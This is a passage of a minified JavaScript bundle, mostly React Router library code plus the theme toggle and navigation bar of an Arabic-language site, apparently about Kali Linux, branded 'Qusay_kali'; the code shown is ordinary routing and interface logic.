    return { usr: e.state, key: e.key, idx: t };
}
function Uc(e, t, n, r) {
    return (
        n === void 0 && (n = null),
        Ti(
            { pathname: typeof e == "string" ? e : e.pathname, search: "", hash: "" },
            typeof t == "string" ? Mo(t) : t,
            { state: n, key: (t && t.key) || r || sb() }
        )
    );
}
function ma(e) {
    let { pathname: t = "/", search: n = "", hash: r = "" } = e;
    return (
        n && n !== "?" && (t += n.charAt(0) === "?" ? n : "?" + n),
        r && r !== "#" && (t += r.charAt(0) === "#" ? r : "#" + r),
        t
    );
}
function Mo(e) {
    let t = {};
    if (e) {
        let n = e.indexOf("#");
        n >= 0 && ((t.hash = e.substr(n)), (e = e.substr(0, n)));
        let r = e.indexOf("?");
        r >= 0 && ((t.search = e.substr(r)), (e = e.substr(0, r))), e && (t.pathname = e);
    }
    return t;
}
function ab(e, t, n, r) {
    r === void 0 && (r = {});
    let { window: o = document.defaultView, v5Compat: i = !1 } = r,
        s = o.history,
        a = $n.Pop,
        c = null,
        u = d();
    u == null && ((u = 0), s.replaceState(Ti({}, s.state, { idx: u }), ""));
    function d() {
        return (s.state || { idx: null }).idx;
    }
    function p() {
        a = $n.Pop;
        let w = d(),
            g = w == null ? null : w - u;
        (u = w), c && c({ action: a, location: y.location, delta: g });
    }
    function m(w, g) {
        a = $n.Push;
        let h = Uc(y.location, w, g);
        u = d() + 1;
        let v = nf(h, u),
            b = y.createHref(h);
        try {
            s.pushState(v, "", b);
        } catch (k) {
            if (k instanceof DOMException && k.name === "DataCloneError") throw k;
            o.location.assign(b);
        }
        i && c && c({ action: a, location: y.location, delta: 1 });
    }
    function f(w, g) {
        a = $n.Replace;
        let h = Uc(y.location, w, g);
        u = d();
        let v = nf(h, u),
            b = y.createHref(h);
        s.replaceState(v, "", b), i && c && c({ action: a, location: y.location, delta: 0 });
    }
    function S(w) {
        let g = o.location.origin !== "null" ? o.location.origin : o.location.href,
            h = typeof w == "string" ? w : ma(w);
        return (
            (h = h.replace(/ $/, "%20")),
            ke(g, "No window.location.(origin|href) available to create URL for href: " + h),
            new URL(h, g)
        );
    }
    let y = {
        get action() {
            return a;
        },
        get location() {
            return e(o, s);
        },
        listen(w) {
            if (c) throw new Error("A history only accepts one active listener");
            return (
                o.addEventListener(tf, p),
                (c = w),
                () => {
                    o.removeEventListener(tf, p), (c = null);
                }
            );
        },
        createHref(w) {
            return t(o, w);
        },
        createURL: S,
        encodeLocation(w) {
            let g = S(w);
            return { pathname: g.pathname, search: g.search, hash: g.hash };
        },
        push: m,
        replace: f,
        go(w) {
            return s.go(w);
        },
    };
    return y;
}
var rf;
(function (e) {
    (e.data = "data"), (e.deferred = "deferred"), (e.redirect = "redirect"), (e.error = "error");
})(rf || (rf = {}));
function lb(e, t, n) {
    return n === void 0 && (n = "/"), cb(e, t, n, !1);
}
function cb(e, t, n, r) {
    let o = typeof t == "string" ? Mo(t) : t,
        i = sd(o.pathname || "/", n);
    if (i == null) return null;
    let s = xy(e);
    ub(s);
    let a = null;
    for (let c = 0; a == null && c < s.length; ++c) {
        let u = Sb(i);
        a = xb(s[c], u, r);
    }
    return a;
}
function xy(e, t, n, r) {
    t === void 0 && (t = []), n === void 0 && (n = []), r === void 0 && (r = "");
    let o = (i, s, a) => {
        let c = {
            relativePath: a === void 0 ? i.path || "" : a,
            caseSensitive: i.caseSensitive === !0,
            childrenIndex: s,
            route: i,
        };
        c.relativePath.startsWith("/") &&
            (ke(
                c.relativePath.startsWith(r),
                'Absolute route path "' +
                    c.relativePath +
                    '" nested under path ' +
                    ('"' + r + '" is not valid. An absolute child route path ') +
                    "must start with the combined path of all its parent routes."
            ),
            (c.relativePath = c.relativePath.slice(r.length)));
        let u = Zn([r, c.relativePath]),
            d = n.concat(c);
        i.children &&
            i.children.length > 0 &&
            (ke(
                i.index !== !0,
                "Index routes must not have child routes. Please remove " +
                    ('all child routes from route path "' + u + '".')
            ),
            xy(i.children, t, d, u)),
            !(i.path == null && !i.index) && t.push({ path: u, score: yb(u, i.index), routesMeta: d });
    };
    return (
        e.forEach((i, s) => {
            var a;
            if (i.path === "" || !((a = i.path) != null && a.includes("?"))) o(i, s);
            else for (let c of wy(i.path)) o(i, s, c);
        }),
        t
    );
}
function wy(e) {
    let t = e.split("/");
    if (t.length === 0) return [];
    let [n, ...r] = t,
        o = n.endsWith("?"),
        i = n.replace(/\?$/, "");
    if (r.length === 0) return o ? [i, ""] : [i];
    let s = wy(r.join("/")),
        a = [];
    return (
        a.push(...s.map((c) => (c === "" ? i : [i, c].join("/")))),
        o && a.push(...s),
        a.map((c) => (e.startsWith("/") && c === "" ? "/" : c))
    );
}
function ub(e) {
    e.sort((t, n) =>
        t.score !== n.score
            ? n.score - t.score
            : vb(
                  t.routesMeta.map((r) => r.childrenIndex),
                  n.routesMeta.map((r) => r.childrenIndex)
              )
    );
}
const db = /^:[\w-]+$/,
    pb = 3,
    fb = 2,
    mb = 1,
    hb = 10,
    gb = -2,
    of = (e) => e === "*";
function yb(e, t) {
    let n = e.split("/"),
        r = n.length;
    return (
        n.some(of) && (r += gb),
        t && (r += fb),
        n.filter((o) => !of(o)).reduce((o, i) => o + (db.test(i) ? pb : i === "" ? mb : hb), r)
    );
}
function vb(e, t) {
    return e.length === t.length && e.slice(0, -1).every((r, o) => r === t[o]) ? e[e.length - 1] - t[t.length - 1] : 0;
}
function xb(e, t, n) {
    let { routesMeta: r } = e,
        o = {},
        i = "/",
        s = [];
    for (let a = 0; a < r.length; ++a) {
        let c = r[a],
            u = a === r.length - 1,
            d = i === "/" ? t : t.slice(i.length) || "/",
            p = sf({ path: c.relativePath, caseSensitive: c.caseSensitive, end: u }, d),
            m = c.route;
        if (
            (!p &&
                u &&
                n &&
                !r[r.length - 1].route.index &&
                (p = sf({ path: c.relativePath, caseSensitive: c.caseSensitive, end: !1 }, d)),
            !p)
        )
            return null;
        Object.assign(o, p.params),
            s.push({ params: o, pathname: Zn([i, p.pathname]), pathnameBase: Pb(Zn([i, p.pathnameBase])), route: m }),
            p.pathnameBase !== "/" && (i = Zn([i, p.pathnameBase]));
    }
    return s;
}
function sf(e, t) {
    typeof e == "string" && (e = { path: e, caseSensitive: !1, end: !0 });
    let [n, r] = wb(e.path, e.caseSensitive, e.end),
        o = t.match(n);
    if (!o) return null;
    let i = o[0],
        s = i.replace(/(.)\/+$/, "$1"),
        a = o.slice(1);
    return {
        params: r.reduce((u, d, p) => {
            let { paramName: m, isOptional: f } = d;
            if (m === "*") {
                let y = a[p] || "";
                s = i.slice(0, i.length - y.length).replace(/(.)\/+$/, "$1");
            }
            const S = a[p];
            return f && !S ? (u[m] = void 0) : (u[m] = (S || "").replace(/%2F/g, "/")), u;
        }, {}),
        pathname: i,
        pathnameBase: s,
        pattern: e,
    };
}
function wb(e, t, n) {
    t === void 0 && (t = !1),
        n === void 0 && (n = !0),
        vy(
            e === "*" || !e.endsWith("*") || e.endsWith("/*"),
            'Route path "' +
                e +
                '" will be treated as if it were ' +
                ('"' + e.replace(/\*$/, "/*") + '" because the `*` character must ') +
                "always follow a `/` in the pattern. To get rid of this warning, " +
                ('please change the route path to "' + e.replace(/\*$/, "/*") + '".')
        );
    let r = [],
        o =
            "^" +
            e
                .replace(/\/*\*?$/, "")
                .replace(/^\/*/, "/")
                .replace(/[\\.*+^${}|()[\]]/g, "\\$&")
                .replace(
                    /\/:([\w-]+)(\?)?/g,
                    (s, a, c) => (r.push({ paramName: a, isOptional: c != null }), c ? "/?([^\\/]+)?" : "/([^\\/]+)")
                );
    return (
        e.endsWith("*")
            ? (r.push({ paramName: "*" }), (o += e === "*" || e === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$"))
            : n
              ? (o += "\\/*$")
              : e !== "" && e !== "/" && (o += "(?:(?=\\/|$))"),
        [new RegExp(o, t ? void 0 : "i"), r]
    );
}
function Sb(e) {
    try {
        return e
            .split("/")
            .map((t) => decodeURIComponent(t).replace(/\//g, "%2F"))
            .join("/");
    } catch (t) {
        return (
            vy(
                !1,
                'The URL path "' +
                    e +
                    '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' +
                    ("encoding (" + t + ").")
            ),
            e
        );
    }
}
function sd(e, t) {
    if (t === "/") return e;
    if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
    let n = t.endsWith("/") ? t.length - 1 : t.length,
        r = e.charAt(n);
    return r && r !== "/" ? null : e.slice(n) || "/";
}
function bb(e, t) {
    t === void 0 && (t = "/");
    let { pathname: n, search: r = "", hash: o = "" } = typeof e == "string" ? Mo(e) : e;
    return { pathname: n ? (n.startsWith("/") ? n : kb(n, t)) : t, search: Eb(r), hash: Nb(o) };
}
function kb(e, t) {
    let n = t.replace(/\/+$/, "").split("/");
    return (
        e.split("/").forEach((o) => {
            o === ".." ? n.length > 1 && n.pop() : o !== "." && n.push(o);
        }),
        n.length > 1 ? n.join("/") : "/"
    );
}
function jl(e, t, n, r) {
    return (
        "Cannot include a '" +
        e +
        "' character in a manually specified " +
        ("`to." + t + "` field [" + JSON.stringify(r) + "].  Please separate it out to the ") +
        ("`to." + n + "` field. Alternatively you may provide the full path as ") +
        'a string in <Link to="..."> and the router will parse it for you.'
    );
}
function Cb(e) {
    return e.filter((t, n) => n === 0 || (t.route.path && t.route.path.length > 0));
}
function Sy(e, t) {
    let n = Cb(e);
    return t ? n.map((r, o) => (o === n.length - 1 ? r.pathname : r.pathnameBase)) : n.map((r) => r.pathnameBase);
}
function by(e, t, n, r) {
    r === void 0 && (r = !1);
    let o;
    typeof e == "string"
        ? (o = Mo(e))
        : ((o = Ti({}, e)),
          ke(!o.pathname || !o.pathname.includes("?"), jl("?", "pathname", "search", o)),
          ke(!o.pathname || !o.pathname.includes("#"), jl("#", "pathname", "hash", o)),
          ke(!o.search || !o.search.includes("#"), jl("#", "search", "hash", o)));
    let i = e === "" || o.pathname === "",
        s = i ? "/" : o.pathname,
        a;
    if (s == null) a = n;
    else {
        let p = t.length - 1;
        if (!r && s.startsWith("..")) {
            let m = s.split("/");
            for (; m[0] === ".."; ) m.shift(), (p -= 1);
            o.pathname = m.join("/");
        }
        a = p >= 0 ? t[p] : "/";
    }
    let c = bb(o, a),
        u = s && s !== "/" && s.endsWith("/"),
        d = (i || s === ".") && n.endsWith("/");
    return !c.pathname.endsWith("/") && (u || d) && (c.pathname += "/"), c;
}
const Zn = (e) => e.join("/").replace(/\/\/+/g, "/"),
    Pb = (e) => e.replace(/\/+$/, "").replace(/^\/*/, "/"),
    Eb = (e) => (!e || e === "?" ? "" : e.startsWith("?") ? e : "?" + e),
    Nb = (e) => (!e || e === "#" ? "" : e.startsWith("#") ? e : "#" + e);
function Tb(e) {
    return (
        e != null &&
        typeof e.status == "number" &&
        typeof e.statusText == "string" &&
        typeof e.internal == "boolean" &&
        "data" in e
    );
}
const ky = ["post", "put", "patch", "delete"];
new Set(ky);
const Ab = ["get", ...ky];
new Set(Ab);
/**
 * React Router v6.30.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function Ai() {
    return (
        (Ai = Object.assign
            ? Object.assign.bind()
            : function (e) {
                  for (var t = 1; t < arguments.length; t++) {
                      var n = arguments[t];
                      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
                  }
                  return e;
              }),
        Ai.apply(this, arguments)
    );
}
const ad = x.createContext(null),
    jb = x.createContext(null),
    Lr = x.createContext(null),
    $a = x.createContext(null),
    Dr = x.createContext({ outlet: null, matches: [], isDataRoute: !1 }),
    Cy = x.createContext(null);
function Rb(e, t) {
    let { relative: n } = t === void 0 ? {} : t;
    Ui() || ke(!1);
    let { basename: r, navigator: o } = x.useContext(Lr),
        { hash: i, pathname: s, search: a } = Ey(e, { relative: n }),
        c = s;
    return r !== "/" && (c = s === "/" ? r : Zn([r, s])), o.createHref({ pathname: c, search: a, hash: i });
}
function Ui() {
    return x.useContext($a) != null;
}
function Io() {
    return Ui() || ke(!1), x.useContext($a).location;
}
function Py(e) {
    x.useContext(Lr).static || x.useLayoutEffect(e);
}
function Mb() {
    let { isDataRoute: e } = x.useContext(Dr);
    return e ? Wb() : Ib();
}
function Ib() {
    Ui() || ke(!1);
    let e = x.useContext(ad),
        { basename: t, future: n, navigator: r } = x.useContext(Lr),
        { matches: o } = x.useContext(Dr),
        { pathname: i } = Io(),
        s = JSON.stringify(Sy(o, n.v7_relativeSplatPath)),
        a = x.useRef(!1);
    return (
        Py(() => {
            a.current = !0;
        }),
        x.useCallback(
            function (u, d) {
                if ((d === void 0 && (d = {}), !a.current)) return;
                if (typeof u == "number") {
                    r.go(u);
                    return;
                }
                let p = by(u, JSON.parse(s), i, d.relative === "path");
                e == null && t !== "/" && (p.pathname = p.pathname === "/" ? t : Zn([t, p.pathname])),
                    (d.replace ? r.replace : r.push)(p, d.state, d);
            },
            [t, r, s, i, e]
        )
    );
}
function Ey(e, t) {
    let { relative: n } = t === void 0 ? {} : t,
        { future: r } = x.useContext(Lr),
        { matches: o } = x.useContext(Dr),
        { pathname: i } = Io(),
        s = JSON.stringify(Sy(o, r.v7_relativeSplatPath));
    return x.useMemo(() => by(e, JSON.parse(s), i, n === "path"), [e, s, i, n]);
}
function Lb(e, t) {
    return Db(e, t);
}
function Db(e, t, n, r) {
    Ui() || ke(!1);
    let { navigator: o } = x.useContext(Lr),
        { matches: i } = x.useContext(Dr),
        s = i[i.length - 1],
        a = s ? s.params : {};
    s && s.pathname;
    let c = s ? s.pathnameBase : "/";
    s && s.route;
    let u = Io(),
        d;
    if (t) {
        var p;
        let w = typeof t == "string" ? Mo(t) : t;
        c === "/" || ((p = w.pathname) != null && p.startsWith(c)) || ke(!1), (d = w);
    } else d = u;
    let m = d.pathname || "/",
        f = m;
    if (c !== "/") {
        let w = c.replace(/^\//, "").split("/");
        f = "/" + m.replace(/^\//, "").split("/").slice(w.length).join("/");
    }
    let S = lb(e, { pathname: f }),
        y = Bb(
            S &&
                S.map((w) =>
                    Object.assign({}, w, {
                        params: Object.assign({}, a, w.params),
                        pathname: Zn([c, o.encodeLocation ? o.encodeLocation(w.pathname).pathname : w.pathname]),
                        pathnameBase:
                            w.pathnameBase === "/"
                                ? c
                                : Zn([
                                      c,
                                      o.encodeLocation ? o.encodeLocation(w.pathnameBase).pathname : w.pathnameBase,
                                  ]),
                    })
                ),
            i,
            n,
            r
        );
    return t && y
        ? x.createElement(
              $a.Provider,
              {
                  value: {
                      location: Ai({ pathname: "/", search: "", hash: "", state: null, key: "default" }, d),
                      navigationType: $n.Pop,
                  },
              },
              y
          )
        : y;
}
function Ob() {
    let e = Vb(),
        t = Tb(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e),
        n = e instanceof Error ? e.stack : null,
        o = { padding: "0.5rem", backgroundColor: "rgba(200,200,200, 0.5)" };
    return x.createElement(
        x.Fragment,
        null,
        x.createElement("h2", null, "Unexpected Application Error!"),
        x.createElement("h3", { style: { fontStyle: "italic" } }, t),
        n ? x.createElement("pre", { style: o }, n) : null,
        null
    );
}
const _b = x.createElement(Ob, null);
class Fb extends x.Component {
    constructor(t) {
        super(t), (this.state = { location: t.location, revalidation: t.revalidation, error: t.error });
    }
    static getDerivedStateFromError(t) {
        return { error: t };
    }
    static getDerivedStateFromProps(t, n) {
        return n.location !== t.location || (n.revalidation !== "idle" && t.revalidation === "idle")
            ? { error: t.error, location: t.location, revalidation: t.revalidation }
            : {
                  error: t.error !== void 0 ? t.error : n.error,
                  location: n.location,
                  revalidation: t.revalidation || n.revalidation,
              };
    }
    componentDidCatch(t, n) {
        console.error("React Router caught the following error during render", t, n);
    }
    render() {
        return this.state.error !== void 0
            ? x.createElement(
                  Dr.Provider,
                  { value: this.props.routeContext },
                  x.createElement(Cy.Provider, { value: this.state.error, children: this.props.component })
              )
            : this.props.children;
    }
}
function zb(e) {
    let { routeContext: t, match: n, children: r } = e,
        o = x.useContext(ad);
    return (
        o &&
            o.static &&
            o.staticContext &&
            (n.route.errorElement || n.route.ErrorBoundary) &&
            (o.staticContext._deepestRenderedBoundaryId = n.route.id),
        x.createElement(Dr.Provider, { value: t }, r)
    );
}
function Bb(e, t, n, r) {
    var o;
    if ((t === void 0 && (t = []), n === void 0 && (n = null), r === void 0 && (r = null), e == null)) {
        var i;
        if (!n) return null;
        if (n.errors) e = n.matches;
        else if ((i = r) != null && i.v7_partialHydration && t.length === 0 && !n.initialized && n.matches.length > 0)
            e = n.matches;
        else return null;
    }
    let s = e,
        a = (o = n) == null ? void 0 : o.errors;
    if (a != null) {
        let d = s.findIndex((p) => p.route.id && (a == null ? void 0 : a[p.route.id]) !== void 0);
        d >= 0 || ke(!1), (s = s.slice(0, Math.min(s.length, d + 1)));
    }
    let c = !1,
        u = -1;
    if (n && r && r.v7_partialHydration)
        for (let d = 0; d < s.length; d++) {
            let p = s[d];
            if (((p.route.HydrateFallback || p.route.hydrateFallbackElement) && (u = d), p.route.id)) {
                let { loaderData: m, errors: f } = n,
                    S = p.route.loader && m[p.route.id] === void 0 && (!f || f[p.route.id] === void 0);
                if (p.route.lazy || S) {
                    (c = !0), u >= 0 ? (s = s.slice(0, u + 1)) : (s = [s[0]]);
                    break;
                }
            }
        }
    return s.reduceRight((d, p, m) => {
        let f,
            S = !1,
            y = null,
            w = null;
        n &&
            ((f = a && p.route.id ? a[p.route.id] : void 0),
            (y = p.route.errorElement || _b),
            c &&
                (u < 0 && m === 0
                    ? ((S = !0), (w = null))
                    : u === m && ((S = !0), (w = p.route.hydrateFallbackElement || null))));
        let g = t.concat(s.slice(0, m + 1)),
            h = () => {
                let v;
                return (
                    f
                        ? (v = y)
                        : S
                          ? (v = w)
                          : p.route.Component
                            ? (v = x.createElement(p.route.Component, null))
                            : p.route.element
                              ? (v = p.route.element)
                              : (v = d),
                    x.createElement(zb, {
                        match: p,
                        routeContext: { outlet: d, matches: g, isDataRoute: n != null },
                        children: v,
                    })
                );
            };
        return n && (p.route.ErrorBoundary || p.route.errorElement || m === 0)
            ? x.createElement(Fb, {
                  location: n.location,
                  revalidation: n.revalidation,
                  component: y,
                  error: f,
                  children: h(),
                  routeContext: { outlet: null, matches: g, isDataRoute: !0 },
              })
            : h();
    }, null);
}
var Ny = (function (e) {
        return (
            (e.UseBlocker = "useBlocker"),
            (e.UseRevalidator = "useRevalidator"),
            (e.UseNavigateStable = "useNavigate"),
            e
        );
    })(Ny || {}),
    ha = (function (e) {
        return (
            (e.UseBlocker = "useBlocker"),
            (e.UseLoaderData = "useLoaderData"),
            (e.UseActionData = "useActionData"),
            (e.UseRouteError = "useRouteError"),
            (e.UseNavigation = "useNavigation"),
            (e.UseRouteLoaderData = "useRouteLoaderData"),
            (e.UseMatches = "useMatches"),
            (e.UseRevalidator = "useRevalidator"),
            (e.UseNavigateStable = "useNavigate"),
            (e.UseRouteId = "useRouteId"),
            e
        );
    })(ha || {});
function Ub(e) {
    let t = x.useContext(ad);
    return t || ke(!1), t;
}
function Hb(e) {
    let t = x.useContext(jb);
    return t || ke(!1), t;
}
function $b(e) {
    let t = x.useContext(Dr);
    return t || ke(!1), t;
}
function Ty(e) {
    let t = $b(),
        n = t.matches[t.matches.length - 1];
    return n.route.id || ke(!1), n.route.id;
}
function Vb() {
    var e;
    let t = x.useContext(Cy),
        n = Hb(ha.UseRouteError),
        r = Ty(ha.UseRouteError);
    return t !== void 0 ? t : (e = n.errors) == null ? void 0 : e[r];
}
function Wb() {
    let { router: e } = Ub(Ny.UseNavigateStable),
        t = Ty(ha.UseNavigateStable),
        n = x.useRef(!1);
    return (
        Py(() => {
            n.current = !0;
        }),
        x.useCallback(
            function (o, i) {
                i === void 0 && (i = {}),
                    n.current && (typeof o == "number" ? e.navigate(o) : e.navigate(o, Ai({ fromRouteId: t }, i)));
            },
            [e, t]
        )
    );
}
function Kb(e, t) {
    e == null || e.v7_startTransition, e == null || e.v7_relativeSplatPath;
}
function sn(e) {
    ke(!1);
}
function Gb(e) {
    let {
        basename: t = "/",
        children: n = null,
        location: r,
        navigationType: o = $n.Pop,
        navigator: i,
        static: s = !1,
        future: a,
    } = e;
    Ui() && ke(!1);
    let c = t.replace(/^\/*/, "/"),
        u = x.useMemo(
            () => ({ basename: c, navigator: i, static: s, future: Ai({ v7_relativeSplatPath: !1 }, a) }),
            [c, a, i, s]
        );
    typeof r == "string" && (r = Mo(r));
    let { pathname: d = "/", search: p = "", hash: m = "", state: f = null, key: S = "default" } = r,
        y = x.useMemo(() => {
            let w = sd(d, c);
            return w == null
                ? null
                : { location: { pathname: w, search: p, hash: m, state: f, key: S }, navigationType: o };
        }, [c, d, p, m, f, S, o]);
    return y == null
        ? null
        : x.createElement(Lr.Provider, { value: u }, x.createElement($a.Provider, { children: n, value: y }));
}
function Qb(e) {
    let { children: t, location: n } = e;
    return Lb(Hc(t), n);
}
new Promise(() => {});
function Hc(e, t) {
    t === void 0 && (t = []);
    let n = [];
    return (
        x.Children.forEach(e, (r, o) => {
            if (!x.isValidElement(r)) return;
            let i = [...t, o];
            if (r.type === x.Fragment) {
                n.push.apply(n, Hc(r.props.children, i));
                return;
            }
            r.type !== sn && ke(!1), !r.props.index || !r.props.children || ke(!1);
            let s = {
                id: r.props.id || i.join("-"),
                caseSensitive: r.props.caseSensitive,
                element: r.props.element,
                Component: r.props.Component,
                index: r.props.index,
                path: r.props.path,
                loader: r.props.loader,
                action: r.props.action,
                errorElement: r.props.errorElement,
                ErrorBoundary: r.props.ErrorBoundary,
                hasErrorBoundary: r.props.ErrorBoundary != null || r.props.errorElement != null,
                shouldRevalidate: r.props.shouldRevalidate,
                handle: r.props.handle,
                lazy: r.props.lazy,
            };
            r.props.children && (s.children = Hc(r.props.children, i)), n.push(s);
        }),
        n
    );
}
/**
 * React Router DOM v6.30.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function $c() {
    return (
        ($c = Object.assign
            ? Object.assign.bind()
            : function (e) {
                  for (var t = 1; t < arguments.length; t++) {
                      var n = arguments[t];
                      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
                  }
                  return e;
              }),
        $c.apply(this, arguments)
    );
}
function qb(e, t) {
    if (e == null) return {};
    var n = {},
        r = Object.keys(e),
        o,
        i;
    for (i = 0; i < r.length; i++) (o = r[i]), !(t.indexOf(o) >= 0) && (n[o] = e[o]);
    return n;
}
function Xb(e) {
    return !!(e.metaKey || e.altKey || e.ctrlKey || e.shiftKey);
}
function Yb(e, t) {
    return e.button === 0 && (!t || t === "_self") && !Xb(e);
}
const Zb = [
        "onClick",
        "relative",
        "reloadDocument",
        "replace",
        "state",
        "target",
        "to",
        "preventScrollReset",
        "viewTransition",
    ],
    Jb = "6";
try {
    window.__reactRouterVersion = Jb;
} catch {}
const ek = "startTransition",
    af = Rf[ek];
function tk(e) {
    let { basename: t, children: n, future: r, window: o } = e,
        i = x.useRef();
    i.current == null && (i.current = ib({ window: o, v5Compat: !0 }));
    let s = i.current,
        [a, c] = x.useState({ action: s.action, location: s.location }),
        { v7_startTransition: u } = r || {},
        d = x.useCallback(
            (p) => {
                u && af ? af(() => c(p)) : c(p);
            },
            [c, u]
        );
    return (
        x.useLayoutEffect(() => s.listen(d), [s, d]),
        x.useEffect(() => Kb(r), [r]),
        x.createElement(Gb, {
            basename: t,
            children: n,
            location: a.location,
            navigationType: a.action,
            navigator: s,
            future: r,
        })
    );
}
const nk = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u",
    rk = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,
    fn = x.forwardRef(function (t, n) {
        let {
                onClick: r,
                relative: o,
                reloadDocument: i,
                replace: s,
                state: a,
                target: c,
                to: u,
                preventScrollReset: d,
                viewTransition: p,
            } = t,
            m = qb(t, Zb),
            { basename: f } = x.useContext(Lr),
            S,
            y = !1;
        if (typeof u == "string" && rk.test(u) && ((S = u), nk))
            try {
                let v = new URL(window.location.href),
                    b = u.startsWith("//") ? new URL(v.protocol + u) : new URL(u),
                    k = sd(b.pathname, f);
                b.origin === v.origin && k != null ? (u = k + b.search + b.hash) : (y = !0);
            } catch {}
        let w = Rb(u, { relative: o }),
            g = ok(u, { replace: s, state: a, target: c, preventScrollReset: d, relative: o, viewTransition: p });
        function h(v) {
            r && r(v), v.defaultPrevented || g(v);
        }
        return x.createElement("a", $c({}, m, { href: S || w, onClick: y || i ? r : h, ref: n, target: c }));
    });
var lf;
(function (e) {
    (e.UseScrollRestoration = "useScrollRestoration"),
        (e.UseSubmit = "useSubmit"),
        (e.UseSubmitFetcher = "useSubmitFetcher"),
        (e.UseFetcher = "useFetcher"),
        (e.useViewTransitionState = "useViewTransitionState");
})(lf || (lf = {}));
var cf;
(function (e) {
    (e.UseFetcher = "useFetcher"), (e.UseFetchers = "useFetchers"), (e.UseScrollRestoration = "useScrollRestoration");
})(cf || (cf = {}));
function ok(e, t) {
    let {
            target: n,
            replace: r,
            state: o,
            preventScrollReset: i,
            relative: s,
            viewTransition: a,
        } = t === void 0 ? {} : t,
        c = Mb(),
        u = Io(),
        d = Ey(e, { relative: s });
    return x.useCallback(
        (p) => {
            if (Yb(p, n)) {
                p.preventDefault();
                let m = r !== void 0 ? r : ma(u) === ma(d);
                c(e, { replace: m, state: o, preventScrollReset: i, relative: s, viewTransition: a });
            }
        },
        [u, c, d, r, o, n, e, i, s, a]
    );
}
const Ay = x.createContext(void 0);
function ik({ children: e }) {
    const [t, n] = x.useState(() => localStorage.getItem("theme") || "dark");
    x.useEffect(() => {
        const o = window.document.documentElement;
        o.classList.remove("light", "dark"), o.classList.add(t), localStorage.setItem("theme", t);
    }, [t]);
    const r = () => {
        n((o) => (o === "dark" ? "light" : "dark"));
    };
    return l.jsx(Ay.Provider, { value: { theme: t, toggleTheme: r, setTheme: n }, children: e });
}
function sk() {
    const e = x.useContext(Ay);
    if (e === void 0) throw new Error("useTheme must be used within a ThemeProvider");
    return e;
}
const uf = () => {
        const { theme: e, toggleTheme: t } = sk();
        return l.jsx("button", {
            onClick: t,
            className:
                "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center hover:border-primary/50 hover:bg-primary/10 transition-all duration-300",
            "aria-label": e === "dark" ? "Switch to light mode" : "Switch to dark mode",
            children:
                e === "dark"
                    ? l.jsx(Ax, { className: "w-5 h-5 text-muted-foreground hover:text-primary transition-colors" })
                    : l.jsx(Sx, { className: "w-5 h-5 text-muted-foreground hover:text-primary transition-colors" }),
        });
    },
    df = [
        { label: "الرئيسية", path: "/" },
        { label: "الدليل الكامل", path: "/guide" },
        { label: "ادوات كالي", path: "/tools" },
        { label: "السكربتات", path: "/scripts" },
        { label: "الذكاء الاصطناعي", path: "/ai" },
        { label: " اوامر كالي لينكس", path: "/cc" },
        { label: "تنزيل كالي", path: "/download" },
    ],
    Or = () => {
        const [e, t] = x.useState(!1),
            n = Io();
        return l.jsx("nav", {
            className: "fixed top-0 left-0 right-0 z-50 bg-background/80 backdrop-blur-xl border-b border-border/30",
            children: l.jsxs("div", {
                className: "container mx-auto px-4",
                children: [
                    l.jsxs("div", {
                        className: "flex items-center justify-between h-16",
                        children: [
                            l.jsxs(fn, {
                                to: "/",
                                className: "flex items-center gap-3 group",
                                children: [
                                    l.jsx("div", {
                                        className:
                                            "w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center group-hover:box-glow transition-all duration-300",
                                        children: l.jsx("span", {
                                            className: "text-primary font-bold text-xl",
                                            children: "Q",
                                        }),
                                    }),
                                    l.jsx("span", {
                                        className: "text-primary font-bold text-xl text-glow-sm",
                                        children: "Qusay_kali",
                                    }),
                                ],
                            }),
                            l.jsx("div", {
                                className: "hidden lg:flex items-center gap-1",
                                children: df.map((r) =>
                                    l.jsx(
                                        fn,
                                        {
                                            to: r.path,
                                            className: n.pathname === r.path ? "nav-link-active" : "nav-link",
                                            children: r.label,
                                        },
                                        r.path
                                    )
                                ),
                            }),
                            l.jsx("div", { className: "hidden lg:flex items-center gap-4", children: l.jsx(uf, {}) }),
                            l.jsxs("div", {
                                className: "lg:hidden flex items-center gap-2",
                                children: [
                                    l.jsx(uf, {}),
                                    l.jsx("button", {
                                        onClick: () => t(!e),
                                        className:
                                            "w-10 h-10 rounded-xl bg-secondary border border-border/50 flex items-center justify-center",
                                        children: e
                                            ? l.jsx(la, { className: "w-5 h-5 text-primary" })
                                            : l.jsx(xx, { className: "w-5 h-5 text-primary" }),
                                    }),
                                ],
                            }),
                        ],
                    }),
                    e &&
                        l.jsx("div", {
                            className: "lg:hidden py-4 border-t border-border/30 animate-fade-in",
                            children: l.jsx("div", {
                                className: "flex flex-col gap-2",
                                children: df.map((r) =>
                                    l.jsx(
                                        fn,
                                        {
                                            to: r.path,
                                            onClick: () => t(!1),
                                            className:
                                                n.pathname === r.path
                                                    ? "nav-link-active text-center"
                                                    : "nav-link text-center",
                                            children: r.label,
                                        },
                                        r.path
                                    )
                                ),
                            }),
                        }),
                ],
            }),
        });
    },
    ak = () =>
        l.jsxs("section", {
            className:
                "relative min-h-screen flex items-center justify-center gradient-cyber-bg cyber-grid overflow-hidden",
            children: [
                l.jsx("div", {
                    className:
                        "absolute top-1/4 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[150px] pointer-events-none",
                }),
                l.jsx("div", {
                    className:
                        "absolute bottom-0 left-1/2 -translate-x-1/2 w-[400px] h-[200px] bg-primary/5 rounded-full blur-[100px] pointer-events-none",
                }),
                l.jsxs("div", {
